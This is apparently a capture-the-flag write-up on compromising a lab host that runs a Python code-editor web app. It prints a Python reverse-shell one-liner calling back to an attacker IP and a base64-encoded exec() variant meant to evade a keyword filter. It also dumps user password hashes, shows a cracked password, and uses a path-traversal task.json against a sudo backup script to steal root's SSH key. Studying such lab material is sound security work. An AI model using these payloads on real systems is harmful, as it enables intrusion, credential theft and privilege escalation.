1, Recon
port scan 
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b5:b9:7c:c4:50:32:95:bc:c2:65:17:df:51:a2:7a:bd (RSA)
|   256 94:b5:25:54:9b:68:af:be:40:e1:1d:a8:6b:85:0d:01 (ECDSA)
|_  256 12:8c:dc:97:ad:86:00:b4:88:e2:29:cf:69:b5:65:96 (ED25519)
5000/tcp open  http    Gunicorn 20.0.4
|_http-title: Python Code Editor
|_http-server-header: gunicorn/20.0.4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Page Check 
![](images/Pasted%20image%2020250324093855.png)
When I want to try to make a reverse shell here, I found there is a clean script here
```
export RHOST="10.10.16.12";export RPORT=443;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
```
Then I get the error message here
```
[](http://10.10.11.62:5000/#)

Use of restricted keywords is not allowed.
```

I guess we can try to make a `base64` encode to passby that
```
import base64

# Base64 编码的字符串
encoded_code = "ZXhwb3J0IFJIT1NUPSIxMC4xMC4xNi4xMiI7ZXhwb3J0IFJQT1JUPTQ0MztweXRob24zIC1jICdpbXBvcnQgc3lzLHNvY2tldCxvcyxwdHk7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KChvcy5nZXRlbnYoIlJIT1NUIiksaW50KG9zLmdldGVudigiUlBPUlQiKSkpKTtbb3MuZHVwMihzLmZpbGVubygpLGZkKSBmb3IgZmQgaW4gKDAsMSwyKV07cHR5LnNwYXduKCIvYmluL2Jhc2giKSc="

# 解码为原始代码
decoded_code = base64.b64decode(encoded_code).decode('utf-8')

print("🔍 解码后的代码如下：\n")
print(decoded_code)

# 执行代码（⚠️ 小心使用）
exec(decoded_code)

```

Very sadly, It still not worked.
But there is still something interesting here, because of there is `login` and `register` label and services, that means there must be the database stored them, so I guess we can try to check the database here.
```
print([u.username for u in db.session.query(User).all()])

print([u.password for u in db.session.query(User).all()])
```

Then we successfully get the result:
```
['development', 'martin'] 
['759b74ce43947f5f4c91aeddc3e5bad3', '3de6f30c4a09c27fc71932bfc68474be']
```

Then we can use hashcat to crack one of them
```
martin:nafeelswordsmaster
```

Then I guess we can use ssh to login, the fact told us I am right,

2, shell as root
There is a directory called `backup` here, and there is something in it.
```
martin@code:~/backups$ ls
code_home_app-production_app_2024_August.tar.bz2  task.json
martin@code:~/backups$ cat task.json 
{
        "destination": "/home/martin/backups/",
        "multiprocessing": true,
        "verbose_log": false,
        "directories_to_archive": [
                "/home/app-production/app"
        ],

        "exclude": [
                ".*"
        ]
}
```
Then I would want to check what `martin`  could do as root.
```
martin@code:~$ sudo -l
Matching Defaults entries for martin on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User martin may run the following commands on localhost:
    (ALL : ALL) NOPASSWD: /usr/bin/backy.sh

```
When I want to check the source code of `backy.sh`, I can only see the messy code.
This script is obfuscated and I cannot see the original code
```
martin@code:~$ sudo /usr/bin/backy.sh 
Usage: /usr/bin/backy.sh <task.json>
```

Let's try to run it.
```
martin@code:~/backups$ sudo /usr/bin/backy.sh task.json 
2025/03/23 23:46:10 🍀 backy 1.2
2025/03/23 23:46:10 📋 Working with task.json ...
2025/03/23 23:46:10 💤 Nothing to sync
2025/03/23 23:46:10 📤 Archiving: [/home/app-production/app]
2025/03/23 23:46:10 📥 To: /home/martin/backups ...
2025/03/23 23:46:10 📦


task.json
{
 "destination": "/home/martin/backups/",
 "multiprocessing": true,
 "verbose_log": false,
 "directories_to_archive": [
  "/home/app-production/app"
 ],

 "exclude": [
  ".*"
 ]
}
```

The work flow I guess would be 
`Back up and synchronize the specified path, and then save it to the destination directory`
For root, same process but /root is blacklisted, 
`you can trick the backy.sh but modifying the above task.json using /var/../root/ for directory to archive....`
```
{
    "destination": "/home/martin/backups/",
    "multiprocessing": true,
    "verbose_log": false,
    "directories_to_archive": [
        "/home/../../root"
    ]
}
```
Then just download it to your local machine and extract it, you can get the id_rsa of root shell, and you can also use it to login as root.



